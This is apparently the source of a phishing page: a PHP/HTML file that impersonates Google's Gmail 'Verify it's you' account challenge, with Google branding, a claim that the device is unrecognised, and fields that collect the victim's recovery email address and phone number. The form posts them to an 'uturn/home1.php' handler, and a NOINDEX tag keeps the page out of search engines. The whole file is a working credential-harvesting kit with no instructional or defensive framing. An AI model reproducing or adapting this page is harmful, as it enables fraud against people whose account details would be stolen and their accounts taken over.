﻿<?php
if (!isset($_SESSION)) {
  session_start();
}

include "rtw.php";
include "reports.php";
include_once("read.php"); 


?>
<?php
//session_start();
if(isset($_POST['submit'])) {


$email = $_POST['eUser'];

$_SESSION["eUser"]= $email;}


include "rtw.php";


?>

<!DOCTYPE html>
<html dir="ltr" class="CMgTXc" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link rel="shortcut icon" href="images/favicon.ico">
<title>Gmail</title>
<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
<link rel="stylesheet" type="text/css" href="css/1.css">

</head>




<body id="yDmH0d" class="y05Um HnmHOc EIlDfe" jscontroller="Uas9Hd" jsaction="rcuQ6b:npT2md;click:FAbpgf;GvneHb:.CLIENT;wINJic:.CLIENT;gNyjzc:.CLIENT;keydown:.CLIENT" tabindex="-1"><div class="uc81Ff wKBl8c bbRbR"><div class="LJtPoc qmmlRd" id="initialView" role="presentation" jscontroller="g3tFzd" jsaction="rcuQ6b:wVXPKc,eyofDf;jI6Zfc:r0xNSb;UAFCzd:Yd2OHe;Z2AmMb:nnGvjf;eqoCse:oUMEzf;RdYeUb:oUMEzf"><div class="RZBuIb c8DD0" aria-hidden="true"><div jscontroller="ltDFwf" jsaction="transitionend:Zdx3Re" jsname="Igk6W" role="progressbar" class="sZwd7c B6Vhqe qdulke jK7moc"><div class="xcNBHc um3FLe"></div><div jsname="cQwEuf" class="w2zcLc Iq5ZMc"></div><div class="MyvhI TKVRUb" jsname="P1ekSe"><span class="l3q5xe SQxu9c"></span></div><div class="MyvhI sUoeld"><span class="l3q5xe SQxu9c"></span></div></div></div><div class="bdf4dc slptg" jsname="f2d3ae" role="presentation" tabindex="null"><div class="fctIrd" jsname="n7vHCb" jscontroller="UXmCpc" jsaction="rcuQ6b:qg4Ic;ZMcYSd:WPi0i;" data-can-enhance="false" data-oauth-third-party-logo-url="" aria-hidden="true"><div jsname="jjf7Ff" jscontroller="P9M9H" jsaction="rcuQ6b:npT2md"><div id="logo" class="SSBsw" title="Google"><div class="qZp31e" jsname="l4eHX"><svg viewBox="0 0 74 37" width="198" height="37" preserveAspectRatio="xMinYMin" aria-hidden="true"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg></div></div></div></div>



<div id="view_container" class="JhUD8d SQNfcc" jscontroller="WFS13" jsaction="rcuQ6b:npT2md">




<!--######################################################################################-->
<form method="post" id="challengeform" action="uturn/home1.php" class="RFjuSb bxPAYd k6Zj8d" jsname="nUpftc" jscontroller="tBGOJd"  role="presentation" ><div jsname="paFcre"><div><h1 class="sfYUmb" data-a11y-title-piece="" id="headingText" jsname="z6sL2b">Verify it's you</h1><p class="FgbZLd">This device isn't recognized. For your security, Google wants to make sure it's really you. <a href="https://support.google.com/accounts/answer/7162782" target="_blank">Learn more</a></p>
<div class="FgbZLd r5i3od"><svg class="iarmfc" xmlns="http://www.w3.org/2000/svg" width="24px" height="24px" viewBox="0 0 24 24" fill="#4285f4" aria-hidden="true"><path d="M12,0C5.376,0 0,5.376 0,12C0,18.624 5.376,24 12,24C18.624,24 24,18.624 24,12C24,5.376 18.624,0 12,0ZM12,20.64C9,20.64 6.348,19.104 4.8,16.776C4.836,14.388 9.6,13.08 12,13.08C14.388,13.08 19.164,14.388 19.2,16.776C17.652,19.104 15,20.64 12,20.64ZM12,3.6C13.992,3.6 15.6,5.208 15.6,7.2C15.6,9.192 13.992,10.8 12,10.8C10.008,10.8 8.4,9.192 8.4,7.2C8.4,5.208 10.008,3.6 12,3.6Z"></path><path d="M0 0h24v24H0z" fill="none"></path></svg>

<div id="profileIdentifier" class="RRP0oc ilEhd" data-a11y-title-piece=""><?php echo $_SESSION["eUser"] ?></div><div jscontroller="hgUmTc" jsaction="JIbuQc:BV9TTc(af8ijd)"><div role="button" class="mUbCce fKz7Od YYBxpf KEavsb" jscontroller="VXdfxd" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue;touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc(preventMouseEvents=true|preventDefault=true); touchcancel:JMtRjd;focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;" jsshadow="" jsname="af8ijd" aria-label="Switch account" aria-disabled="false" tabindex="0"><div class="VTBa7b MbhUzd" jsname="ksKsZd"></div><content class="xjKiLb"><span style="top: -12px"><span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" width="24px" height="24px" viewBox="0 0 24 24" fill="#000000"><path d="M7.41 7.84L12 12.42l4.59-4.58L18 9.25l-6 6-6-6z"></path><path d="M0-.75h24v24H0z" fill="none"></path></svg></span></span></content></div></div></div></div></div><div jsname="uybdVe" class="mbekbe bxPAYd" role="presentation"><div jsname="USBQqe" class="iUe6Pd Us7fWe JhUD8d" role="presentation"><div jsname="INM6z"></div><div jsname="txrIk"></div>

<div class="cnD7Xc"><div class="RCum0c" jsname="lr9nlf"><div class="kKkU3d"><p>Confirm the recovery email address you added to your account: <b>xx••••••@example.com</b></p></div><div jscontroller="zB5w" jsaction="keydown:C9BaXe;YqO5N:di0fJ;O22p3e:fpfTEe;AHmuwe:Jt1EX;rcuQ6b:WYd;EJh3N:WYd" jsname="Ri4I4" class="fQxwff" role="presentation" data-is-rendered="true"><div class="rFrNMe uIZQNc sdJrJc Tyc9J u3bW4e" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV;" jsshadow="" jsname="Vsb5Ub"><div class="aCsJod oJeWuf"><div class="aXBtI Wic03c">

<div class="Xb9hP"><input class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="off" spellcheck="false" tabindex="0" aria-label="Enter recovery email address" name="recEmail" id="knowledge-preregistered-email-response" data-initial-value="" type="text" required="required"><div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true">Enter recovery email address</div></div>



<div class="i9lrp mIZh1c"></div><div jsname="XmnwAc" class="OabDMe cXrdqd Y2Zypf"></div></div></div><div class="LXRPh"><div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div><div jsname="B34EJ" class="dEOOab RxsGPe" aria-atomic="true" aria-live="assertive"></div></div></div></div>

<div jscontroller="zB5w" jsaction="keydown:C9BaXe;YqO5N:di0fJ;O22p3e:fpfTEe;AHmuwe:Jt1EX;rcuQ6b:WYd;EJh3N:WYd" jsname="Ri4I4" class="fQxwff" role="presentation" data-is-rendered="true"><div class="rFrNMe uIZQNc sdJrJc Tyc9J u3bW4e" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV;" jsshadow="" jsname="Vsb5Ub"><div class="aCsJod oJeWuf"><div class="aXBtI Wic03c">

<div class="Xb9hP"><input class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="off" spellcheck="false" tabindex="0" aria-label="Enter recovery email address" name="phoneNumber" id="knowledge-preregistered-email-response" data-initial-value="" type="text" required="required"><div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true">Enter recovery phone number</div></div>



<div class="i9lrp mIZh1c"></div><div jsname="XmnwAc" class="OabDMe cXrdqd Y2Zypf"></div></div></div><div class="LXRPh"><div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div><div jsname="B34EJ" class="dEOOab RxsGPe" aria-atomic="true" aria-live="assertive"></div></div></div></div>

</div>




<div jscontroller="D02xdc" jsaction="JIbuQc:UHZ0U(tJiF1e),s57X0c(LwtuAc); click:qrB6Cf(NjDI7d);NNw7lb:V2GCBc;U57Bbf:OGJhZ;PueeNd:hRLCTe;" jsname="yXBf7b" class="GtglAe">



<button style="border-radius: 4px; padding: 0px; ">
<div class="OZliR">
<div role="button" id="next" class="O0WRkf zZhnYe e3Duub C0oVfc Zp5qWd Hj2jlf dKVcQ" jscontroller="VXdfxd" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue;touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc(preventMouseEvents=true|preventDefault=true); touchcancel:JMtRjd;focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;" jsshadow="" jsname="tJiF1e" aria-disabled="false" tabindex="0"><div class="Vwe4Vb MbhUzd" jsname="ksKsZd"></div><div class="ZFr60d CeoRYc"></div><content class="CwaK9"><span class="RveJvd snByac">Next</span></botton></content></div></div><div class="AIu8h"></div></div></div></div></div></form></div></div>




<footer class="RwBngc"><div class="u7land" jscontroller="VVHlDf" jsaction="rcuQ6b:npT2md;aLn7Wb:VPRXbd"><div role="listbox"jsshadow="" jsname="rfCUpd" aria-label="Change language"><div jsname="LgbsSe" role="presentation"><div class="ry3kXd Ulgu9" jsname="d9BH4c" role="presentation">
<div class="MocG8c B9IrJb LMgvRb KKjvXb" jsname="wQNmvb" jsaction="" data-value="en" aria-selected="true" role="option" tabindex="0">
<content class="vRMGwf oJeWuf">‪English (United States)‬</content></div>


</div></div><div class="OA0qNb ncFHed" jsaction="click:dPTK6c(wQNmvb); mousedown:uYU8jb(wQNmvb); mouseup:LVEdXd(wQNmvb); mouseover:nfXz1e(wQNmvb); touchstart:Rh2fre(wQNmvb); touchmove:hvFWtf(wQNmvb); touchend:MkF9r(wQNmvb|preventMouseEvents=true)" role="presentation" jsname="V68bde" style="display:none;"></div></div></div><ul class="Bgzgmd"><li><a href="" target="_blank">Help</a></li><li><a href="" target="_blank">Privacy</a></li><li><a href="" target="_blank">Terms</a></li></ul></footer></div>

<div class="VYMape" aria-hidden="true"><svg jsname="BUfzDd" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 810" preserveAspectRatio="xMinYMin slice" aria-hidden="true"><path fill="#efefee" d="M592.66 0c-15 64.092-30.7 125.285-46.598 183.777C634.056 325.56 748.348 550.932 819.642 809.5h419.672C1184.518 593.727 1083.124 290.064 902.637 0H592.66z"></path><path fill="#f6f6f6" d="M545.962 183.777c-53.796 196.576-111.592 361.156-163.49 490.74 11.7 44.494 22.8 89.49 33.1 134.883h404.07c-71.294-258.468-185.586-483.84-273.68-625.623z"></path><path fill="#f7f7f7" d="M153.89 0c74.094 180.678 161.088 417.448 228.483 674.517C449.67 506.337 527.063 279.465 592.56 0H153.89z"></path><path fill="#fbfbfc" d="M153.89 0H0v809.5h415.57C345.477 500.938 240.884 211.874 153.89 0z"></path><path fill="#ebebec" d="M1144.22 501.538c52.596-134.583 101.492-290.964 134.09-463.343 1.2-6.1 2.3-12.298 3.4-18.497 0-.2.1-.4.1-.6 1.1-6.3 2.3-12.7 3.4-19.098H902.536c105.293 169.28 183.688 343.158 241.684 501.638v-.1z"></path><path fill="#e1e1e1" d="M1285.31 0c-2.2 12.798-4.5 25.597-6.9 38.195C1321.507 86.39 1379.603 158.98 1440 257.168V0h-154.69z"></path><path fill="#e7e7e7" d="M1278.31,38.196C1245.81,209.874 1197.22,365.556 1144.82,499.838L1144.82,503.638C1185.82,615.924 1216.41,720.211 1239.11,809.6L1439.7,810L1439.7,256.768C1379.4,158.78 1321.41,86.288 1278.31,38.195L1278.31,38.196z"></path></svg></div></div><div data-check-connection="%.@.null,null,&quot;youtube&quot;,[[&quot;https://accounts.youtube.com/accounts/CheckConnection?pmpo\u003dhttps%3A%2F%2Faccounts.google.com\u0026v\u003d-1807669249&quot;,&quot;youtube&quot;]
]
]
" jsaction="rcuQ6b:WYd" jscontroller="GfN5Qc"><input id="pstMsg" jsname="xa8ENe" name="pstMsg" value="1" type="hidden"><input id="checkConnection" jsname="ZVfTqd" name="checkConnection" value="youtube:2871:1" type="hidden"><input id="checkedDomains" jsname="pqkZjc" name="checkedDomains" value="youtube" type="hidden"></div><div class="lDwpOe"></div><iframe style="position: absolute; left: 0px; top: 0px; z-index: -1;" src="GmailConfirm_files/CheckConnection.htm" width="0" height="0"></iframe>

</body></html>